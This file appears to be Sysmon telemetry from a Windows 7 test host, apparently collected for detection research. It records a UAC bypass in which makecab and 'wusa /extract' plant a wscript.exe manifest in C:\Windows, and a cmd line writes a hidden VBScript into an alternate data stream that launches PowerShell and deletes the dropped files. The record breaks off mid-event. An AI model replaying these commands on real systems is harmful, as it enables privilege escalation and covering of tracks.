@@ -1,0 +1,591 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>11</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>11</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:18.765888200Z" />
+      <EventRecordID>11219</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:18.765</Data>
+      <Data Name="ProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ProcessId">1900</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\wscript.exe.manifest</Data>
+      <Data Name="CreationUtcTime">2019-05-09 02:52:18.765</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:18.844013200Z" />
+      <EventRecordID>11220</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:18.812</Data>
+      <Data Name="ProcessGuid">{365abb72-95e2-5cd3-0000-001097410f00}</Data>
+      <Data Name="ProcessId">1292</Data>
+      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Microsoft« Cabinet Maker</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\makecab.exe" C:\Users\IEUser\AppData\Local\Temp\wscript.exe.manifest C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp </Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:18.922138200Z" />
+      <EventRecordID>11222</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:18.859</Data>
+      <Data Name="ProcessGuid">{365abb72-95e2-5cd3-0000-0010c6440f00}</Data>
+      <Data Name="ProcessId">3636</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:18.953388200Z" />
+      <EventRecordID>11224</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:18.906</Data>
+      <Data Name="ProcessGuid">{365abb72-95e2-5cd3-0000-001083470f00}</Data>
+      <Data Name="ProcessId">3620</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe" "C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:18.969013200Z" />
+      <EventRecordID>11226</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:18.922</Data>
+      <Data Name="ProcessGuid">{365abb72-95e2-5cd3-0000-001074490f00}</Data>
+      <Data Name="ProcessId">2420</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:19.250263200Z" />
+      <EventRecordID>11228</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:19.172</Data>
+      <Data Name="ProcessGuid">{365abb72-95e3-5cd3-0000-00100c650f00}</Data>
+      <Data Name="ProcessId">3536</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020a43a0100}</Data>
+      <Data Name="LogonId">0x13aa4</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:21.250263200Z" />
+      <EventRecordID>11229</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:21.234</Data>
+      <Data Name="ProcessGuid">{365abb72-95e5-5cd3-0000-00101f720f00}</Data>
+      <Data Name="ProcessId">3828</Data>
+      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Microsoft« Cabinet Maker</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\makecab.exe" C:\Windows\System32\wscript.exe C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp </Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:21.265888200Z" />
+      <EventRecordID>11231</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:21.234</Data>
+      <Data Name="ProcessGuid">{365abb72-95e5-5cd3-0000-00108f720f00}</Data>
+      <Data Name="ProcessId">3824</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:21.281513200Z" />
+      <EventRecordID>11233</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:21.234</Data>
+      <Data Name="ProcessGuid">{365abb72-95e5-5cd3-0000-001065730f00}</Data>
+      <Data Name="ProcessId">2852</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe" "C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:21.297138200Z" />
+      <EventRecordID>11235</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:21.234</Data>
+      <Data Name="ProcessGuid">{365abb72-95e5-5cd3-0000-001033750f00}</Data>
+      <Data Name="ProcessId">2364</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:21.594013200Z" />
+      <EventRecordID>11237</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:21.422</Data>
+      <Data Name="ProcessGuid">{365abb72-95e5-5cd3-0000-0010e1890f00}</Data>
+      <Data Name="ProcessId">2800</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020a43a0100}</Data>
+      <Data Name="LogonId">0x13aa4</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:23.500263200Z" />
+      <EventRecordID>11238</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:23.484</Data>
+      <Data Name="ProcessGuid">{365abb72-95e7-5cd3-0000-001046950f00}</Data>
+      <Data Name="ProcessId">2812</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+      <Data Name="Description">Windows Command Processor</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe"  /C "echo Dim objShell:Dim oFso:Set oFso = CreateObject("Scripting.FileSystemObject"):Set objShell = WScript.CreateObject("WScript.Shell"):command = "powershell.exe":objShell.Run command, 0:command = "C:\Windows\System32\cmd.exe /c ""start /b """" cmd /c ""timeout /t 5 &gt;nul&amp;&amp;del C:\Windows\wscript.exe&amp;&amp;del C:\Windows\wscript.exe.manifest""""":objShell.Run command, 0:Set objShell = Nothing &gt; "C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>15</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>15</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:23.500263200Z" />
+      <EventRecordID>11240</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:23.500</Data>
